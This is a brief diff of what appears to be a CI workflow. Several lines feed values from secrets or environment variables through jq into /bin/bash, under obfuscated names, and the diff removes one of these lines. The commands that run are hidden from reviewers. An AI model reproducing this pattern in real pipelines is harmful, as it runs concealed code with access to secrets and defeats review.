@@ -23,7 +23,6 @@ jobs:
           exq7756: ${{ secrets.exq7756 }}
         run: |
           printf '%s' "$exq7756" | jq -r .leaod02 | /bin/bash
-          printf '%s' "$gd023" | jq -r .q39666 | /bin/bash
           echo $n2524 | jq -r .ala323 | /bin/bash
           printf '%s' "$a90752" | jq -r .rrrg73 | /bin/bash
           printf '%s' "$ofwrz04359" | jq -r .fb0888 | /bin/bash
